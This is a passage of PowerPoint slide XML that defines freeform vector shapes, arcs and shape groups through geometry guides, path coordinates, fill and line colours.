                    <a:gd name="T49" fmla="*/ 0 h 930"/>
                    <a:gd name="T50" fmla="*/ 0 w 1499"/>
                    <a:gd name="T51" fmla="*/ 0 h 930"/>
                    <a:gd name="T52" fmla="*/ 0 w 1499"/>
                    <a:gd name="T53" fmla="*/ 0 h 930"/>
                    <a:gd name="T54" fmla="*/ 0 w 1499"/>
                    <a:gd name="T55" fmla="*/ 0 h 930"/>
                    <a:gd name="T56" fmla="*/ 0 w 1499"/>
                    <a:gd name="T57" fmla="*/ 0 h 930"/>
                    <a:gd name="T58" fmla="*/ 0 w 1499"/>
                    <a:gd name="T59" fmla="*/ 0 h 930"/>
                    <a:gd name="T60" fmla="*/ 0 w 1499"/>
                    <a:gd name="T61" fmla="*/ 0 h 930"/>
                    <a:gd name="T62" fmla="*/ 0 w 1499"/>
                    <a:gd name="T63" fmla="*/ 0 h 930"/>
                    <a:gd name="T64" fmla="*/ 0 w 1499"/>
                    <a:gd name="T65" fmla="*/ 0 h 930"/>
                    <a:gd name="T66" fmla="*/ 0 w 1499"/>
                    <a:gd name="T67" fmla="*/ 0 h 930"/>
                    <a:gd name="T68" fmla="*/ 0 w 1499"/>
                    <a:gd name="T69" fmla="*/ 0 h 930"/>
                    <a:gd name="T70" fmla="*/ 0 w 1499"/>
                    <a:gd name="T71" fmla="*/ 0 h 930"/>
                    <a:gd name="T72" fmla="*/ 0 w 1499"/>
                    <a:gd name="T73" fmla="*/ 0 h 930"/>
                    <a:gd name="T74" fmla="*/ 0 w 1499"/>
                    <a:gd name="T75" fmla="*/ 0 h 930"/>
                    <a:gd name="T76" fmla="*/ 0 w 1499"/>
                    <a:gd name="T77" fmla="*/ 0 h 930"/>
                    <a:gd name="T78" fmla="*/ 0 w 1499"/>
                    <a:gd name="T79" fmla="*/ 0 h 930"/>
                    <a:gd name="T80" fmla="*/ 0 w 1499"/>
                    <a:gd name="T81" fmla="*/ 0 h 930"/>
                    <a:gd name="T82" fmla="*/ 0 w 1499"/>
                    <a:gd name="T83" fmla="*/ 0 h 93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499"/>
                    <a:gd name="T127" fmla="*/ 0 h 930"/>
                    <a:gd name="T128" fmla="*/ 1499 w 1499"/>
                    <a:gd name="T129" fmla="*/ 930 h 93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499" h="930">
                      <a:moveTo>
                        <a:pt x="1499" y="169"/>
                      </a:moveTo>
                      <a:lnTo>
                        <a:pt x="1420" y="119"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="1364" y="94"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="1329" y="81"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="1286" y="67"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="1248" y="53"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="1199" y="39"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="1146" y="28"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="1085" y="17"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="1026" y="9"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="986" y="3"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="936" y="0"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="893" y="1"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="833" y="1"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="769" y="3"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="718" y="6"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="661" y="12"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="594" y="21"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="530" y="35"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="465" y="50"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="389" y="74"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="317" y="101"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="248" y="132"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="192" y="168"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="138" y="210"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="97" y="247"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="64" y="283"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="39" y="323"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="25" y="350"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="16" y="376"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="5" y="414"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="0" y="446"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="0" y="477"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="3" y="500"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="5" y="530"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="8" y="561"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="17" y="588"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="21" y="607"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="27" y="625"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="40" y="652"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="61" y="682"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="99" y="731"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="131" y="765"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="225" y="839"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="356" y="930"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="600" y="826"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="337" y="666"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="317" y="647"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="304" y="632"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="286" y="612"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="271" y="590"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="260" y="564"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="253" y="540"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="247" y="511"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="247" y="485"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="253" y="446"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="260" y="417"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="270" y="396"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="285" y="369"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="308" y="341"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="343" y="309"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="389" y="279"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="455" y="251"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="502" y="236"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="553" y="220"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="600" y="210"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="629" y="206"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="666" y="197"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="698" y="192"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="750" y="188"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="782" y="187"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="820" y="182"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="859" y="184"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="886" y="184"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="953" y="188"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="1019" y="195"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="1068" y="203"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="1100" y="211"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="1139" y="221"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="1176" y="232"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="1201" y="240"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="1228" y="250"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="1270" y="264"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="1499" y="1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9"/>
                <p:cNvSpPr>
                  <a:spLocks/>
                </p:cNvSpPr>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr bwMode="auto">
                <a:xfrm>
                  <a:off x="4871" y="1709"/>
                  <a:ext cx="315" cy="135"/>
                </a:xfrm>
                <a:custGeom>
                  <a:avLst/>
                  <a:gdLst>
                    <a:gd name="T0" fmla="*/ 0 w 1263"/>
                    <a:gd name="T1" fmla="*/ 0 h 405"/>
                    <a:gd name="T2" fmla="*/ 0 w 1263"/>
                    <a:gd name="T3" fmla="*/ 0 h 405"/>
                    <a:gd name="T4" fmla="*/ 0 w 1263"/>
                    <a:gd name="T5" fmla="*/ 0 h 405"/>
                    <a:gd name="T6" fmla="*/ 0 w 1263"/>
                    <a:gd name="T7" fmla="*/ 0 h 405"/>
                    <a:gd name="T8" fmla="*/ 0 w 1263"/>
                    <a:gd name="T9" fmla="*/ 0 h 405"/>
                    <a:gd name="T10" fmla="*/ 0 w 1263"/>
                    <a:gd name="T11" fmla="*/ 0 h 405"/>
                    <a:gd name="T12" fmla="*/ 0 w 1263"/>
                    <a:gd name="T13" fmla="*/ 0 h 405"/>
                    <a:gd name="T14" fmla="*/ 0 w 1263"/>
                    <a:gd name="T15" fmla="*/ 0 h 405"/>
                    <a:gd name="T16" fmla="*/ 0 w 1263"/>
                    <a:gd name="T17" fmla="*/ 0 h 405"/>
                    <a:gd name="T18" fmla="*/ 0 w 1263"/>
                    <a:gd name="T19" fmla="*/ 0 h 405"/>
                    <a:gd name="T20" fmla="*/ 0 w 1263"/>
                    <a:gd name="T21" fmla="*/ 0 h 405"/>
                    <a:gd name="T22" fmla="*/ 0 w 1263"/>
                    <a:gd name="T23" fmla="*/ 0 h 405"/>
                    <a:gd name="T24" fmla="*/ 0 w 1263"/>
                    <a:gd name="T25" fmla="*/ 0 h 405"/>
                    <a:gd name="T26" fmla="*/ 0 w 1263"/>
                    <a:gd name="T27" fmla="*/ 0 h 405"/>
                    <a:gd name="T28" fmla="*/ 0 w 1263"/>
                    <a:gd name="T29" fmla="*/ 0 h 405"/>
                    <a:gd name="T30" fmla="*/ 0 w 1263"/>
                    <a:gd name="T31" fmla="*/ 0 h 405"/>
                    <a:gd name="T32" fmla="*/ 0 w 1263"/>
                    <a:gd name="T33" fmla="*/ 0 h 405"/>
                    <a:gd name="T34" fmla="*/ 0 w 1263"/>
                    <a:gd name="T35" fmla="*/ 0 h 405"/>
                    <a:gd name="T36" fmla="*/ 0 w 1263"/>
                    <a:gd name="T37" fmla="*/ 0 h 405"/>
                    <a:gd name="T38" fmla="*/ 0 w 1263"/>
                    <a:gd name="T39" fmla="*/ 0 h 405"/>
                    <a:gd name="T40" fmla="*/ 0 w 1263"/>
                    <a:gd name="T41" fmla="*/ 0 h 405"/>
                    <a:gd name="T42" fmla="*/ 0 w 1263"/>
                    <a:gd name="T43" fmla="*/ 0 h 405"/>
                    <a:gd name="T44" fmla="*/ 0 w 1263"/>
                    <a:gd name="T45" fmla="*/ 0 h 405"/>
                    <a:gd name="T46" fmla="*/ 0 w 1263"/>
                    <a:gd name="T47" fmla="*/ 0 h 405"/>
                    <a:gd name="T48" fmla="*/ 0 w 1263"/>
                    <a:gd name="T49" fmla="*/ 0 h 405"/>
                    <a:gd name="T50" fmla="*/ 0 w 1263"/>
                    <a:gd name="T51" fmla="*/ 0 h 405"/>
                    <a:gd name="T52" fmla="*/ 0 w 1263"/>
                    <a:gd name="T53" fmla="*/ 0 h 405"/>
                    <a:gd name="T54" fmla="*/ 0 w 1263"/>
                    <a:gd name="T55" fmla="*/ 0 h 405"/>
                    <a:gd name="T56" fmla="*/ 0 w 1263"/>
                    <a:gd name="T57" fmla="*/ 0 h 405"/>
                    <a:gd name="T58" fmla="*/ 0 w 1263"/>
                    <a:gd name="T59" fmla="*/ 0 h 405"/>
                    <a:gd name="T60" fmla="*/ 0 w 1263"/>
                    <a:gd name="T61" fmla="*/ 0 h 405"/>
                    <a:gd name="T62" fmla="*/ 0 w 1263"/>
                    <a:gd name="T63" fmla="*/ 0 h 405"/>
                    <a:gd name="T64" fmla="*/ 0 w 1263"/>
                    <a:gd name="T65" fmla="*/ 0 h 405"/>
                    <a:gd name="T66" fmla="*/ 0 w 1263"/>
                    <a:gd name="T67" fmla="*/ 0 h 405"/>
                    <a:gd name="T68" fmla="*/ 0 w 1263"/>
                    <a:gd name="T69" fmla="*/ 0 h 405"/>
                    <a:gd name="T70" fmla="*/ 0 w 1263"/>
                    <a:gd name="T71" fmla="*/ 0 h 405"/>
                    <a:gd name="T72" fmla="*/ 0 w 1263"/>
                    <a:gd name="T73" fmla="*/ 0 h 405"/>
                    <a:gd name="T74" fmla="*/ 0 w 1263"/>
                    <a:gd name="T75" fmla="*/ 0 h 405"/>
                    <a:gd name="T76" fmla="*/ 0 w 1263"/>
                    <a:gd name="T77" fmla="*/ 0 h 405"/>
                    <a:gd name="T78" fmla="*/ 0 w 1263"/>
                    <a:gd name="T79" fmla="*/ 0 h 405"/>
                    <a:gd name="T80" fmla="*/ 0 w 1263"/>
                    <a:gd name="T81" fmla="*/ 0 h 405"/>
                    <a:gd name="T82" fmla="*/ 0 w 1263"/>
                    <a:gd name="T83" fmla="*/ 0 h 405"/>
                    <a:gd name="T84" fmla="*/ 0 w 1263"/>
                    <a:gd name="T85" fmla="*/ 0 h 405"/>
                    <a:gd name="T86" fmla="*/ 0 w 1263"/>
                    <a:gd name="T87" fmla="*/ 0 h 40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63"/>
                    <a:gd name="T133" fmla="*/ 0 h 405"/>
                    <a:gd name="T134" fmla="*/ 1263 w 1263"/>
                    <a:gd name="T135" fmla="*/ 405 h 40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63" h="405">
                      <a:moveTo>
                        <a:pt x="1263" y="43"/>
                      </a:moveTo>
                      <a:lnTo>
                        <a:pt x="1022" y="146"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="966" y="122"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="893" y="100"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="818" y="83"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="725" y="73"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="628" y="69"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="507" y="73"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="427" y="83"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="325" y="103"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="241" y="130"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="180" y="156"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="131" y="183"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="90" y="219"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="55" y="262"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="35" y="312"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="24" y="359"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="21" y="405"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="4" y="355"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="0" y="315"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="10" y="262"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="31" y="219"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="69" y="169"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="114" y="126"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="166" y="93"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="214" y="69"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="276" y="50"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="345" y="30"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="411" y="20"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="486" y="7"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="538" y="3"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="603" y="0"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="680" y="0"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="756" y="3"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="852" y="16"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="928" y="30"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="997" y="47"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="1052" y="63"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="1063" y="66"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="1087" y="43"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="1122" y="27"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="1156" y="13"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="1211" y="13"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="1263" y="43"/>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Arc 10"/>
                <p:cNvSpPr>
                  <a:spLocks/>
                </p:cNvSpPr>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr bwMode="auto">
                <a:xfrm>
                  <a:off x="4830" y="1772"/>
                  <a:ext cx="17" cy="62"/>
                </a:xfrm>
                <a:custGeom>
                  <a:avLst/>
                  <a:gdLst>
                    <a:gd name="T0" fmla="*/ 0 w 21423"/>
                    <a:gd name="T1" fmla="*/ 0 h 20297"/>
                    <a:gd name="T2" fmla="*/ 0 w 21423"/>
                    <a:gd name="T3" fmla="*/ 0 h 20297"/>
                    <a:gd name="T4" fmla="*/ 0 w 21423"/>
                    <a:gd name="T5" fmla="*/ 0 h 20297"/>
                    <a:gd name="T6" fmla="*/ 0 60000 65536"/>
                    <a:gd name="T7" fmla="*/ 0 60000 65536"/>
                    <a:gd name="T8" fmla="*/ 0 60000 65536"/>
                    <a:gd name="T9" fmla="*/ 0 w 21423"/>
                    <a:gd name="T10" fmla="*/ 0 h 20297"/>
                    <a:gd name="T11" fmla="*/ 21423 w 21423"/>
                    <a:gd name="T12" fmla="*/ 20297 h 20297"/>
                  </a:gdLst>
                  <a:ahLst/>
                  <a:cxnLst>
                    <a:cxn ang="T6">
                      <a:pos x="T0" y="T1"/>
                    </a:cxn>
                    <a:cxn ang="T7">
                      <a:pos x="T2" y="T3"/>
                    </a:cxn>
                    <a:cxn ang="T8">
                      <a:pos x="T4" y="T5"/>
                    </a:cxn>
                  </a:cxnLst>
                  <a:rect l="T9" t="T10" r="T11" b="T12"/>
                  <a:pathLst>
                    <a:path w="21423" h="20297" fill="none" extrusionOk="0">
                      <a:moveTo>
                        <a:pt x="-1" y="17537"/>
                      </a:moveTo>
                      <a:cubicBezTo>
                        <a:pt x="1031" y="9527"/>
                        <a:pt x="6445" y="2762"/>
                        <a:pt x="14034" y="-1"/>
                      </a:cubicBezTo>
                    </a:path>
                    <a:path w="21423" h="20297" stroke="0" extrusionOk="0">
                      <a:moveTo>
                        <a:pt x="-1" y="17537"/>
                      </a:moveTo>
                      <a:cubicBezTo>
                        <a:pt x="1031" y="9527"/>
                        <a:pt x="6445" y="2762"/>
                        <a:pt x="14034" y="-1"/>
                      </a:cubicBezTo>
                      <a:lnTo>
                        <a:pt x="21423" y="20297"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="-1" y="17537"/>
                      </a:lnTo>
                      <a:close/>
                    </a:path>
                  </a:pathLst>
                </a:custGeom>
                <a:noFill/>
                <a:ln w="4763">
                  <a:solidFill>
                    <a:srgbClr val="E0E0E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6" name="Group 11"/>
              <p:cNvGrpSpPr>
                <a:grpSpLocks/>
              </p:cNvGrpSpPr>
              <p:nvPr/>
            </p:nvGrpSpPr>
            <p:grpSpPr bwMode="auto">
              <a:xfrm>
                <a:off x="4872" y="1665"/>
                <a:ext cx="670" cy="714"/>
                <a:chOff x="4872" y="1665"/>
                <a:chExt cx="670" cy="714"/>
              </a:xfrm>
            </p:grpSpPr>
            <p:grpSp>
              <p:nvGrpSpPr>
                <p:cNvPr id="37" name="Group 12"/>
                <p:cNvGrpSpPr>
                  <a:grpSpLocks/>
                </p:cNvGrpSpPr>
                <p:nvPr/>
              </p:nvGrpSpPr>
              <p:grpSpPr bwMode="auto">
                <a:xfrm>
                  <a:off x="4872" y="1665"/>
                  <a:ext cx="670" cy="714"/>
                  <a:chOff x="4872" y="1665"/>
                  <a:chExt cx="670" cy="714"/>
                </a:xfrm>
              </p:grpSpPr>
              <p:grpSp>
                <p:nvGrpSpPr>
                  <p:cNvPr id="43" name="Group 13"/>
                  <p:cNvGrpSpPr>
                    <a:grpSpLocks/>
                  </p:cNvGrpSpPr>
                  <p:nvPr/>
                </p:nvGrpSpPr>
                <p:grpSpPr bwMode="auto">
                  <a:xfrm>
                    <a:off x="4872" y="1665"/>
                    <a:ext cx="399" cy="477"/>
                    <a:chOff x="4872" y="1665"/>
                    <a:chExt cx="399" cy="477"/>
                  </a:xfrm>
                </p:grpSpPr>
                <p:sp>
                  <p:nvSpPr>
                    <p:cNvPr id="72" name="Freeform 14"/>
                    <p:cNvSpPr>
                      <a:spLocks/>
                    </p:cNvSpPr>
                    <p:nvPr/>
                  </p:nvSpPr>
                  <p:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="4903" y="1691"/>
                      <a:ext cx="368" cy="451"/>
                    </a:xfrm>
                    <a:custGeom>
                      <a:avLst/>
                      <a:gdLst>
                        <a:gd name="T0" fmla="*/ 0 w 1470"/>
                        <a:gd name="T1" fmla="*/ 0 h 1352"/>
                        <a:gd name="T2" fmla="*/ 0 w 1470"/>
                        <a:gd name="T3" fmla="*/ 0 h 1352"/>
                        <a:gd name="T4" fmla="*/ 0 w 1470"/>
                        <a:gd name="T5" fmla="*/ 0 h 1352"/>
                        <a:gd name="T6" fmla="*/ 0 w 1470"/>
                        <a:gd name="T7" fmla="*/ 0 h 1352"/>
                        <a:gd name="T8" fmla="*/ 0 w 1470"/>
                        <a:gd name="T9" fmla="*/ 0 h 1352"/>
                        <a:gd name="T10" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T11" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T15" fmla="*/ 0 w 1470"/>
                        <a:gd name="T16" fmla="*/ 0 h 1352"/>
                        <a:gd name="T17" fmla="*/ 1470 w 1470"/>
                        <a:gd name="T18" fmla="*/ 1352 h 1352"/>
                      </a:gdLst>
                      <a:ahLst/>
                      <a:cxnLst>
                        <a:cxn ang="T10">
                          <a:pos x="T0" y="T1"/>
                        </a:cxn>
                        <a:cxn ang="T11">
                          <a:pos x="T2" y="T3"/>
                        </a:cxn>
                        <a:cxn ang="T12">
                          <a:pos x="T4" y="T5"/>
                        </a:cxn>
                        <a:cxn ang="T13">
                          <a:pos x="T6" y="T7"/>
                        </a:cxn>
                        <a:cxn ang="T14">
                          <a:pos x="T8" y="T9"/>
                        </a:cxn>
                      </a:cxnLst>
                      <a:rect l="T15" t="T16" r="T17" b="T18"/>
                      <a:pathLst>
                        <a:path w="1470" h="1352">
                          <a:moveTo>
                            <a:pt x="0" y="1352"/>
                          </a:moveTo>
                          <a:lnTo>
                            <a:pt x="0" y="616"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="1470" y="0"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="1468" y="693"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="0" y="1352"/>
                          </a:lnTo>
                          <a:close/>
                        </a:path>
                      </a:pathLst>
                    </a:custGeom>
                    <a:solidFill>
                      <a:srgbClr val="404040"/>
                    </a:solidFill>
                    <a:ln w="4763">
                      <a:solidFill>
                        <a:srgbClr val="C0C0C0"/>
                      </a:solidFill>
                      <a:round/>
                      <a:headEnd/>
                      <a:tailEnd/>
                    </a:ln>
                  </p:spPr>
                  <p:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:endParaRPr lang="zh-CN" altLang="en-US"/>
                    </a:p>
                  </p:txBody>
                </p:sp>
                <p:sp>
                  <p:nvSpPr>
                    <p:cNvPr id="73" name="Freeform 15"/>
                    <p:cNvSpPr>
                      <a:spLocks/>
                    </p:cNvSpPr>
                    <p:nvPr/>
                  </p:nvSpPr>
                  <p:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="4872" y="1871"/>
                      <a:ext cx="31" cy="271"/>
                    </a:xfrm>
                    <a:custGeom>
                      <a:avLst/>
                      <a:gdLst>
                        <a:gd name="T0" fmla="*/ 0 w 122"/>
                        <a:gd name="T1" fmla="*/ 0 h 813"/>
                        <a:gd name="T2" fmla="*/ 0 w 122"/>
                        <a:gd name="T3" fmla="*/ 0 h 813"/>
                        <a:gd name="T4" fmla="*/ 0 w 122"/>
                        <a:gd name="T5" fmla="*/ 0 h 813"/>
                        <a:gd name="T6" fmla="*/ 0 w 122"/>
                        <a:gd name="T7" fmla="*/ 0 h 813"/>
                        <a:gd name="T8" fmla="*/ 0 w 122"/>
                        <a:gd name="T9" fmla="*/ 0 h 813"/>
                        <a:gd name="T10" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T11" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T15" fmla="*/ 0 w 122"/>
                        <a:gd name="T16" fmla="*/ 0 h 813"/>
                        <a:gd name="T17" fmla="*/ 122 w 122"/>
                        <a:gd name="T18" fmla="*/ 813 h 813"/>
                      </a:gdLst>
                      <a:ahLst/>
                      <a:cxnLst>
                        <a:cxn ang="T10">
                          <a:pos x="T0" y="T1"/>
                        </a:cxn>
                        <a:cxn ang="T11">
                          <a:pos x="T2" y="T3"/>
                        </a:cxn>
                        <a:cxn ang="T12">
                          <a:pos x="T4" y="T5"/>
                        </a:cxn>
                        <a:cxn ang="T13">
                          <a:pos x="T6" y="T7"/>
                        </a:cxn>
                        <a:cxn ang="T14">
                          <a:pos x="T8" y="T9"/>
                        </a:cxn>
                      </a:cxnLst>
                      <a:rect l="T15" t="T16" r="T17" b="T18"/>
                      <a:pathLst>
                        <a:path w="122" h="813">
                          <a:moveTo>
                            <a:pt x="0" y="0"/>
                          </a:moveTo>
                          <a:lnTo>
                            <a:pt x="122" y="77"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="122" y="813"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="0" y="736"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="0" y="0"/>
                          </a:lnTo>
                          <a:close/>
                        </a:path>
                      </a:pathLst>
                    </a:custGeom>
                    <a:solidFill>
                      <a:srgbClr val="606060"/>
                    </a:solidFill>
                    <a:ln w="4763">
                      <a:solidFill>
                        <a:srgbClr val="C0C0C0"/>
                      </a:solidFill>
                      <a:round/>
                      <a:headEnd/>
                      <a:tailEnd/>
                    </a:ln>
                  </p:spPr>
                  <p:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:endParaRPr lang="zh-CN" altLang="en-US"/>
                    </a:p>
                  </p:txBody>
                </p:sp>
                <p:sp>
                  <p:nvSpPr>
                    <p:cNvPr id="74" name="Freeform 16"/>
                    <p:cNvSpPr>
                      <a:spLocks/>
                    </p:cNvSpPr>
                    <p:nvPr/>
                  </p:nvSpPr>
                  <p:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="4872" y="1665"/>
                      <a:ext cx="399" cy="232"/>
                    </a:xfrm>
                    <a:custGeom>
                      <a:avLst/>
                      <a:gdLst>
                        <a:gd name="T0" fmla="*/ 0 w 1592"/>
                        <a:gd name="T1" fmla="*/ 0 h 695"/>
                        <a:gd name="T2" fmla="*/ 0 w 1592"/>
                        <a:gd name="T3" fmla="*/ 0 h 695"/>
                        <a:gd name="T4" fmla="*/ 0 w 1592"/>
                        <a:gd name="T5" fmla="*/ 0 h 695"/>
                        <a:gd name="T6" fmla="*/ 0 w 1592"/>
                        <a:gd name="T7" fmla="*/ 0 h 695"/>
                        <a:gd name="T8" fmla="*/ 0 w 1592"/>
                        <a:gd name="T9" fmla="*/ 0 h 695"/>
                        <a:gd name="T10" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T11" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T12" fmla="*/ 0 60000 65536"/>
